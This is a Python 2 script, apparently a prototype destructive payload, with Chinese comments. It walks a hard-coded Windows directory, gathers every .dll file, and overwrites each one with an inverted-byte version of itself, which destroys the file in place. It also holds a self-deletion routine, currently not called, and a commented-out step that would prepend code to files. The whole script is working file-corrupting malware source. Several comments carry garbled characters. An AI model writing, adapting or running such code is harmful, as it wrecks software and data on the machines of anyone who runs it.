#!/usr/bin/env python
# coding=utf-8
import os
import sys
import platform
import binascii
# import random


class Encryptiong():
    def __init__(self, hex_str):
        # self.random_str = random.random()
        self.hex_str = hex_str
        self.enc_str = ''
        self.encryptiong_dict = {
                '0': 'f',
                '1': 'e',
                '2': 'd',
                '3': 'c',
                '4': 'b',
                '5': 'a',
                '6': '9',
                '7': '8',
                '8': '7',
                '9': '6',
                'a': '5',
                'b': '4',
                'c': '3',
                'd': '2',
                'e': '1',
                'f': '0',
            }

    def encryptiong(self):
        # salt = self.random[2]
        for i in self.hex_str:
            if i in self.encryptiong_dict:
                self.enc_str += self.encryptiong_dict[i]
            else:
                self.enc_str += i
        return binascii.a2b_hex(self.enc_str)
        

class Work_NT(): ##Windows
    def __init__(self, path_dir, python_version): ##定义所需变量
        self.python_exe = os.popen('where python', 'r').read().replace('\n','')
        self.python_dir = os.path.dirname(self.python_exe)
        self.dir = path_dir
        self.python_version = python_version
        self.get_file_list = []
        self.get_pyfile_list = []
        
    def get_all_info(self): ##获取指定目录下所有文äﾻ?
        for root,dirs,files in os.walk(self.dir):
            for name in files:
                self.get_file_list.append(os.path.join(root,name))

    def get_file_type(self): ##判断文件类型,现阶段使用后缀判断.后期修改成通过文件头判æﾖ?
        for i in self.get_file_list:
            if os.path.splitext(i)[1] == '.dll':
                self.get_pyfile_list.append(i)
        # for i in self.get_file_list:
            # with open(i, 'rb+')

    def work(self): ##向指定文件类型进行写入操äﾽ?现阶段为向py类型写入
        for i in self.get_pyfile_list:
            with open(i, 'rb+') as f:
                hex_str = f.read().encode('hex')
            with open(i, 'wb') as f:
                enc_work = Encryptiong(hex_str)
                f.write(enc_work.encryptiong())
#                content = f.read()
#               f.seek(0, 0)
#              f.write('print "Fuck"\n' + content)

    def go_die(self):
        os.remove(os.getcwd() + '\\' + os.path.basename(__file__))

def main():
    result = raw_input("Dont to go!")
    if result == "Just Go":
        os_version = platform.system()
        python_version = sys.version
        if sys.version[0] == '2':
            python_version = 2
        else:
            python_version = 3
        python_dir = r'D:\1'
        if os_version == 'Windows':
            Windows_work = Work_NT(python_dir, python_version)
            Windows_work.get_all_info()
            Windows_work.get_file_type()
            Windows_work.work()
            # Windows_work.go_die()
        elif os_version == 'Linux':
            pass

if __name__ == '__main__':
    main()
